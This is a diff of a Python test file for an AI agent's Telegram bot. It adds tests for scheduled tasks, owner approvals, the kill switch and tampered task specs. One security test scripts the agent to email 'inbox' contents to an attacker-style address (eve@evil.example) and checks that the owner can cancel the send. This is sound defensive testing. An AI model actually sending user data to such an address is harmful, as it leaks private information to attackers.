@@ -4,18 +4,22 @@ import sqlite3
 from collections.abc import Callable, Iterator, Sequence
 from contextlib import closing, suppress
 from dataclasses import dataclass, field
-from datetime import UTC, datetime
+from datetime import UTC, datetime, timedelta
 from pathlib import Path
 from typing import Any
 
 import pyotp
 import pytest
 
-from bastion.config import TelegramSettings
-from bastion.core.agent import Agent
+from bastion.autonomy.runner import TaskAgent, TaskRunner
+from bastion.autonomy.tasks import Task, TaskStore
+from bastion.config import AutonomySettings, TelegramSettings
+from bastion.core.agent import Agent, Approver
+from bastion.core.prompts import task_system_prompt
 from bastion.llm.types import Message
 from bastion.security.approvals import ApprovalService
 from bastion.security.audit import AuditLog, parse_checkpoint
+from bastion.security.crypto import FieldCipher
 from bastion.security.killswitch import KillSwitch
 from bastion.security.policy import PolicyEngine, default_policy
 from bastion.security.redact import REDACTED, Redactor
@@ -31,6 +35,8 @@ from bastion.telegram.bot import (
     NO_CODE_EXPECTED,
     STOPPED,
     TAINT_NOTICE,
+    TASKS_FOOTER,
+    TASKS_OFF,
     ConfigurationChanged,
     TelegramBot,
 )
@@ -111,6 +117,7 @@ def make_rig(
     settings: TelegramSettings | None = None,
     api: FakeTelegramApi | None = None,
     still_valid: Callable[[], bool] = lambda: True,
+    tasks: TaskStore | None = None,
 ) -> Rig:
     api = api or FakeTelegramApi()
     audit = AuditLog(conn, b"k" * 32, Redactor())
@@ -152,8 +159,34 @@ def make_rig(
         warn=warnings.append,
         monotonic=ticker,
         sleep=fake_sleep,
+        tasks=task_runner(tasks, provider, registry, audit) if tasks is not None else None,
     )
     return Rig(bot, api, audit, KillSwitch(home), provider, ticker, redactor, sleeps, warnings)
+
+
+def task_runner(
+    store: TaskStore, provider: ScriptedProvider, registry: ToolRegistry, audit: AuditLog
+) -> TaskRunner:
+    """What Runtime.task_runner builds, over the rig's provider and tools."""
+
+    def make(task: Task, approver: Approver) -> TaskAgent:
+        granted = ToolRegistry(
+            [tool for name in task.spec.tools if (tool := registry.get(name)) is not None]
+        )
+        agent = Agent(
+            provider=provider,
+            tools=granted,
+            policy=PolicyEngine(default_policy(), registry.names).for_task(
+                task.name, granted.names
+            ),
+            approvals=ApprovalService(),
+            approver=approver,
+            audit=audit,
+            system_prompt=task_system_prompt(task.name),
+        )
+        return TaskAgent(agent, tuple(sorted(granted.names)), ())
+
+    return TaskRunner(store, AutonomySettings(), audit, make)
 
 
 async def finish(rig: Rig) -> None:
@@ -603,7 +636,14 @@ async def test_run_skips_the_backlog_and_announces_a_checkpoint(
     assert rig.api.texts[-1] == "Hello"
     assert len(rig.provider.requests) == 1  # the stale request never ran
     assert [offset for offset, _ in rig.api.polls] == [-1, 2, 3]  # acknowledged
-    assert [name for name, _ in rig.api.commands] == ["new", "status", "cancel", "stop", "help"]
+    assert [name for name, _ in rig.api.commands] == [
+        "new",
+        "status",
+        "tasks",
+        "cancel",
+        "stop",
+        "help",
+    ]
     assert {"session.start", "session.end"} <= set(rig.events())
 
 
@@ -837,3 +877,233 @@ async def test_a_checkpoint_failure_is_contained(
     await rig.bot.send_checkpoint()
 
     assert "telegram.checkpoint_failed" in rig.events()
+
+
+# --------------------------------------------------------------- scheduled tasks
+
+
+class TaskClock:
+    def __init__(self) -> None:
+        self.now = NOW
+
+    def __call__(self) -> datetime:
+        return self.now
+
+
+def task_store(conn: sqlite3.Connection, clock: TaskClock) -> TaskStore:
+    return TaskStore(conn, FieldCipher(b"t" * 32), clock=clock, tz=UTC)
+
+
+def schedule(store: TaskStore, tools: Sequence[str] = ("echo",)) -> Task:
+    spec = store.new_spec(
+        name="Morning brief",
+        schedule="daily 13:00",
+        instructions="Tell me the headline.",
+        tools=tools,
+        grantable=frozenset({"echo", "send_email"}),
+        created_via="cli",
+    )
+    return store.add(spec, limit=20)
+
+
+def make_due(clock: TaskClock, task: Task) -> None:
+    assert task.next_run is not None
+    clock.now = task.next_run + timedelta(seconds=10)
+
+
+async def test_a_due_task_runs_and_reports_to_the_owner(
+    home: Path, conn: sqlite3.Connection
+) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    task = schedule(store)
+    rig = make_rig(home, conn, reply("Headline: all calm."), tasks=store)
+    make_due(clock, task)
+
+    await rig.bot.check_schedule()
+    await finish(rig)
+    await rig.bot.check_schedule()  # already claimed: nothing more runs
+
+    assert rig.api.texts == [f"Scheduled task 'Morning brief' ({task.id})\n\nHeadline: all calm."]
+    assert store.recent_runs(task.id)[0].outcome == "completed"
+
+
+@pytest.mark.security
+async def test_a_tasks_send_waits_for_the_owner_who_can_cancel_it(
+    home: Path, conn: sqlite3.Connection
+) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    task = schedule(store, tools=("send_email",))
+    sender = SendEmailTool()
+    rig = make_rig(
+        home,
+        conn,
+        use_tools(call("send_email", to="eve@evil.example", body="inbox")),
+        tools=[EchoTool(), sender],
+        tasks=store,
+    )
+    make_due(clock, task)
+
+    await rig.bot.check_schedule()
+    await rig.prompted()
+    prompt = rig.api.last_keyboard().text
+    await rig.say("what is on today?")
+    await rig.say("/cancel")
+    await finish(rig)
+
+    assert "scheduled task 'Morning brief'" in prompt
+    assert sender.sent == []
+    assert "Running the scheduled task 'Morning brief'" in rig.api.texts[-2]
+    assert rig.api.texts[-1] == "Cancelled."
+    assert store.recent_runs(task.id)[0].outcome == "cancelled"
+    assert len(rig.provider.requests) == 1  # the owner's message was not run meanwhile
+
+
+async def test_an_approved_send_from_a_task_runs(home: Path, conn: sqlite3.Connection) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    task = schedule(store, tools=("send_email",))
+    sender = SendEmailTool()
+    rig = make_rig(
+        home,
+        conn,
+        use_tools(call("send_email", to="bob@example.com", body="hi")),
+        reply("Sent the note."),
+        tools=[EchoTool(), sender],
+        tasks=store,
+    )
+    make_due(clock, task)
+
+    await rig.bot.check_schedule()
+    await rig.prompted()
+    await rig.tap("Approve")
+    await finish(rig)
+
+    assert len(sender.sent) == 1
+    assert rig.api.texts[-1].endswith("Sent the note.")
+
+
+@pytest.mark.security
+async def test_no_task_starts_while_bastion_is_stopped(
+    home: Path, conn: sqlite3.Connection
+) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    task = schedule(store)
+    rig = make_rig(home, conn, tasks=store)
+    rig.switch.engage(via="telegram", at=NOW)
+    make_due(clock, task)
+
+    await rig.bot.check_schedule()
+
+    assert rig.provider.requests == [] and rig.api.sent == []
+    assert store.get(task.id) == task  # not even claimed: it runs once Bastion resumes
+
+
+async def test_a_task_waits_for_the_owners_request_to_finish(
+    home: Path, conn: sqlite3.Connection
+) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    task = schedule(store)
+    rig = make_rig(
+        home,
+        conn,
+        use_tools(call("send_email", to="bob@example.com", body="hi")),
+        tools=[EchoTool(), SendEmailTool()],
+        tasks=store,
+    )
+    await rig.say("email bob")
+    await rig.prompted()
+    make_due(clock, task)
+
+    await rig.bot.check_schedule()
+
+    assert store.get(task.id) == task
+    await rig.say("/cancel")
+    await finish(rig)
+
+
+async def test_missed_and_tampered_tasks_are_reported(home: Path, conn: sqlite3.Connection) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    missed = schedule(store)
+    tampered = schedule(store)
+    conn.execute("UPDATE tasks SET spec = 'v1:AAAA' WHERE id = ?", (tampered.id,))
+    rig = make_rig(home, conn, tasks=store)
+    clock.now = NOW + timedelta(days=2)
+
+    await rig.bot.check_schedule()
+
+    assert rig.api.texts == [
+        f"Skipped the scheduled task 'Morning brief' ({missed.id}): it was due "
+        "Mon 2026-11-23 13:00 +0000, while Bastion was offline.",
+        f"The scheduled task {tampered.id} was changed outside Bastion, so it will not run. "
+        f"Remove it on your computer with: bastion tasks remove {tampered.id}",
+    ]
+    assert rig.provider.requests == []
+
+
+async def test_the_tasks_command_lists_scheduled_tasks(
+    home: Path, conn: sqlite3.Connection
+) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    task = schedule(store)
+    with_tasks = make_rig(home, conn, tasks=store)
+    without = make_rig(home, conn)
+
+    await with_tasks.say("/tasks")
+    await with_tasks.say("/status")
+    await without.say("/tasks")
+
+    listing = with_tasks.api.texts[0]
+    assert f"Morning brief ({task.id}): daily 13:00" in listing
+    assert listing.endswith(TASKS_FOOTER)
+    assert "Scheduled tasks: 1 active, 0 paused." in with_tasks.api.texts[1]
+    assert without.api.texts == [TASKS_OFF]
+
+
+async def test_a_failing_schedule_check_does_not_stop_the_bot(
+    home: Path, conn: sqlite3.Connection, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    rig = make_rig(home, conn, tasks=task_store(conn, TaskClock()))
+
+    def broken() -> None:
+        raise ValueError("bad row")
+
+    assert rig.bot._tasks is not None
+    monkeypatch.setattr(rig.bot._tasks, "take_due", broken)
+
+    await rig.bot.check_schedule()  # must not raise
+
+    assert "task.schedule_failed" in rig.events()
+
+
+@pytest.mark.security
+async def test_a_due_task_takes_the_slot_before_any_notice_is_sent(
+    home: Path, conn: sqlite3.Connection
+) -> None:
+    clock = TaskClock()
+    store = task_store(conn, clock)
+    missed, fresh = schedule(store), schedule(store)
+    make_due(clock, fresh)
+    long_ago = (clock.now - timedelta(days=1)).isoformat(timespec="seconds")
+    conn.execute("UPDATE tasks SET next_run = ? WHERE id = ?", (long_ago, missed.id))
+    rig = make_rig(home, conn, reply("Fresh report."), tasks=store)
+    busy_at_each_send: list[bool] = []
+    original = rig.api.send_message
+
+    async def watching(*args: Any, **kwargs: Any) -> int:
+        busy_at_each_send.append(rig.bot._busy())
+        return await original(*args, **kwargs)
+
+    rig.api.send_message = watching  # type: ignore[method-assign]
+
+    await rig.bot.check_schedule()
+    await finish(rig)
+
+    assert busy_at_each_send[0] is True  # the run held the slot before the first notice
+    assert rig.api.texts[0].startswith(f"Skipped the scheduled task 'Morning brief' ({missed.id})")
+    assert rig.api.texts[-1].endswith("Fresh report.")
